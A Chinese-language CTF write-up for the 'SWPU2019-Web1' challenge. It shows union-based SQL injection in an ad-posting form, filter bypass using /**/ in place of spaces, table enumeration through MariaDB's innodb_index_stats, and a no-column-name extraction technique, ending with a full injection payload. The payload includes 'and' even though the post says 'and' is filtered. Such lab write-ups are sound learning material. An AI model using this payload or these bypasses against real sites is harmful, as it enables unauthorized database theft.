---
title: SWPU2019-Web1
tags:  [CTF,BUU]
date: 2020-09-13 10:22:57
categories: [CTF,BUU]
---



# Buu刷题记

## 一、题目打开介绍

![image-20200913095530231.png](https://i.loli.net/2020/09/13/7cQB8umN1sZLyOp.png)这是题目本身打开的样子，继续进入题目

## 二、做题

![image-20200913095634097.png](https://i.loli.net/2020/09/13/YHLftTQmUd1besK.png)

简单的登陆界面和注册界面，没有sql注入**已经尝试**

<!--more-->

![image-20200913095733239.png](https://i.loli.net/2020/09/13/cfFtN41xLoAQEjO.png)

申请发布广告

![image-20200913095759770.png](https://i.loli.net/2020/09/13/sOEZrzKgn2LqU5t.png)

习惯性的测试

![image-20200913095857022.png](https://i.loli.net/2020/09/13/vDZlT7YSPexgVrJ.png)

然后开始尝试注入，抓包，

![image-20200913095931186.png](https://i.loli.net/2020/09/13/RjvFaOTiMcZuBgG.png)
![image-20200913095944857.png](https://i.loli.net/2020/09/13/eZLKpvNyosAEJnP.png)

两个都要，经过union注入判断列数，发现是22列

然后收集信息

```
database() web1
version() 10.2.26-MariaDB-log
```

然后开始使用**information**库进行爆表，爆字段
![image-20200913100124933.png](https://i.loli.net/2020/09/13/6fwnvVYWotsuXDS.png)

然后没有用，再加上一下字符被毁掉

```
and or updatexml 空格
```

用/**/代替空格，然后继续解决无法爆出表的问题

经过百度发现还有一个表可以爆出表名

https://mariadb.com/kb/en/mysqlinnodb_index_stats/

就是上面这个库，然后开始继续操作就行

```
tables() FLAG_TABLE,news,users,gtid_slave_pos,ads,users
```

这就是已经取得的数据。

下面解决无法爆字段的问题

```
select * from users
```

如果直接使用这个命令的·话，他会返回多条数据然后并且报错，并且我们现在无法知道字段名，必须再想其他的办法

```
select 1,2,3 union select * from users
```

这样就可以造出临时表，字段名分别可以知道了**需要猜一下字段数**

最后 payload

```
title=-1'and/**/union/**/select/**/1,(select/**/group_concat(b)from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'&content=a&ac=add
```

这里有两个注意的点

### 1.临时表再次使用时必须要有一个别名

### 2.记得带括号

### 3.数字不能做字段名

